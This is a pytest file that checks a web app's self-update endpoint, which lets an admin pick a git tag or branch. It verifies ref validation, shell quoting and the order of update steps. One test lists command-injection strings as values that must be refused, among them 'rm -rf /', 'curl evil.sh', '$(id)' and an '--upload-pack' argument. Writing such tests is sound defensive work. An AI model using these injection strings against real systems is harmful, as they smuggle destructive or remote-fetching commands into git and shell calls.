"""Choosing WHICH version to update to.

Before this, the updater hard-coded `origin/main`: an instance always moved to the newest commit,
so there was no way to hold on a release or step down after a bad one. Tagging v1.0 made both
meaningful.

The target is a string from the browser that ends up in a `git` command inside a helper container,
so the tests here are mostly about that boundary — and about the ordering that decides whether a
typo leaves a working checkout or a half-applied one.
"""
import re

import pytest

from geodeploy.routers import admin


def test_the_default_is_unchanged_behaviour():
    """An instance that never touches the new control must keep updating exactly as it did."""
    from geodeploy.routers.admin import UpdateRequest

    assert UpdateRequest().target == "main"


def test_the_target_pattern_accepts_real_refs_and_nothing_else():
    ok = ("main", "v1.0", "v1.10", "v2.0-rc1", "release/1.x", "feat/some_thing", "1.0")
    bad = ("v1.0; rm -rf /", "--upload-pack=evil", "v1.0 && curl evil.sh", "$(id)", "`id`",
           "v1.0|sh", "a" * 101, "", "v1.0'")
    for ref in ok:
        assert admin._TARGET_RE.match(ref), f"{ref!r} is a legitimate ref and should be accepted"
    for ref in bad:
        assert not admin._TARGET_RE.match(ref), f"{ref!r} must be refused"


def test_main_is_resolved_against_the_remote():
    """`main` must become `origin/main`. A stale LOCAL main — left behind by a rollback, or by a
    manual checkout — would otherwise be treated as the newest version and the update would be a
    no-op that reports success."""
    import inspect

    src = inspect.getsource(admin.start_update)
    assert '"origin/main" if target == "main"' in src


def test_the_target_is_shell_quoted():
    """It is interpolated into an `sh -c` string for the helper container. The pattern already
    excludes shell metacharacters; quoting is the second lock, because the pattern is one edit away
    from being loosened and this line would not visibly change."""
    import inspect

    src = inspect.getsource(admin.start_update)
    assert "shlex.quote(ref)" in src


def test_the_updater_validates_the_target_itself():
    """The API is the only caller today and will not always be. A script that reaches `git reset
    --hard $1` must not depend on its caller having checked."""
    import pathlib

    sh = (pathlib.Path(__file__).resolve().parents[2] / "installer" / "self-update.sh"
          ).read_text(encoding="utf-8")
    assert 'TARGET="${1:-origin/main}"' in sh, "must default to origin/main for existing callers"
    assert "Refusing an unsafe update target" in sh


def test_the_updater_fetches_tags_and_resolves_before_resetting():
    """Two ordering rules, both learned the hard way elsewhere in this codebase:

    * `git fetch origin main` alone does not bring TAGS, so a released version cannot be resolved.
    * resolving AFTER `git reset --hard` means a typo'd tag has already destroyed the checkout.
    """
    import pathlib

    sh = (pathlib.Path(__file__).resolve().parents[2] / "installer" / "self-update.sh"
          ).read_text(encoding="utf-8")
    assert "--tags" in sh
    assert sh.index("rev-parse -q --verify") < sh.index('git reset --hard "$TARGET_COMMIT"')


def test_releases_are_optional():
    """The picker is a convenience; the update CHECK is not. A repo with no releases, or a
    rate-limited GitHub, must still answer whether an update exists.

    The fetch moved into `_load_releases` (it now joins /tags with /releases so the panel can tell
    which release is RUNNING), so the guarantee moved with it: the loader swallows its own failures
    instead of the call site doing it. Same invariant, one level down — `test_update_channels.py`
    proves it behaviourally against a 403.
    """
    import inspect

    src = inspect.getsource(admin.check_updates)
    assert '"releases": []' in src, "the key must always exist so the UI can test its length"
    # Still fetched before the commit comparison, and still unable to break it.
    head = src[:src.index("latest_r = await client.get")]
    assert "_load_releases" in head
    assert "except Exception:" in inspect.getsource(admin._load_releases)
